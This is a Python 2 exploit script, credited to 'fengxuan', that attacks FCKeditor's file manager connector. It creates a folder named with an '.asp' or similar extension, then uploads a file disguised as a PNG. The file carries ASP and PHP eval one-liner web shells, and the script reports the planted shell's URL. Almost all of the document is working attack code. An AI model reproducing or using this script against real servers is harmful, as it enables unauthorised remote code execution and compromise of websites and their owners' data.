#!/usr/bin/env python
#!-*- coding:utf-8 -*-
import sys
import requests
import socket
import re
import StringIO,gzip,zlib
from urlparse import urlparse

def usage(name):
	output = '''
{0} http://www.evalshell.com/ /Fckeditor/ asp
 by fengxuan 2015/11/11
	'''.format(name)
	print output
	return 0


def CreateFolder(url, type):
	payload = url + "/editor/filemanager/connectors/{0}/connector.{0}?Command=CreateFolder&Type=File&CurrentFolder=/fuck.{0}&NewFolderName=fuck.{0}".format(type)
	r = requests.get(payload).text 
	try:
		flag = re.search(r"<Error\s+?number=\"(.*?)\"\s+?/>", r).group(1)
	except:
		pass
	if flag == 102:
		print "[*] sorry CreateFolder failed\n"
		sys.exit()
	else:
		print "[!] CreateFolder is ok \n"

	

def UploadShell(url, www, type):
	p = urlparse(url).netloc
	if p.find(':') > 0:
		port = int(p[p.find(':')+1:])
		host = p[:p.find(':')]
	else:
		port = 80
		host = p
	payload = www + "/editor/filemanager/connectors/{0}/connector.{0}?Command=FileUpload&Type=File&CurrentFolder=fuck.{0}".format(type)
	padding ='''-----------------------------265001916915724\r
Content-Disposition: form-data; name="R1"\r
\r
V2

-----------------------------265001916915724\r
Content-Disposition: form-data; name="NewFile"; filename="x.png"\r
Content-Type: image/png\r
\r
Gif89a?
<% eval request("w") %><?php eval($_POST["w"] ?>
-----------------------------265001916915724--\r
'''.strip()
	
	req = '''POST {0} HTTP/1.1\r
Host: {1}\r
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\r
Accept-Encoding: gzip, deflate\r
DNT: 1\r
Proxy-Connection: keep-alive\r
Content-Type: multipart/form-data; boundary=---------------------------265001916915724\r
Content-Length: {2}\r
\r
{3}\r
'''.format(payload,host, len(padding), padding)
	socket.setdefaulttimeout(5)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	s.send(req)
	data = ''
	while r"/script" not in data:
		try:
			data = s.recv(1000)
		except:
			break
	s.close()
	partten = 'OnUploadCompleted\(\d+?,"(.+?)"'
	flag = re.search(partten, data)
	# print flag.group(1)
	if flag != None:
		print "[!] shell is {0}".format(url+flag.group(1))
	else:
		print data
		print "[!] Mayb eUpl0ad She11 failed or use gzip encode!\n\n"


def main():
	if len(sys.argv) < 3:
		usage(sys.argv[0])
		sys.exit()

	CreateFolder(sys.argv[1]+sys.argv[2], sys.argv[3])
	UploadShell(sys.argv[1], sys.argv[2], sys.argv[3])

if __name__ == "__main__":
	main()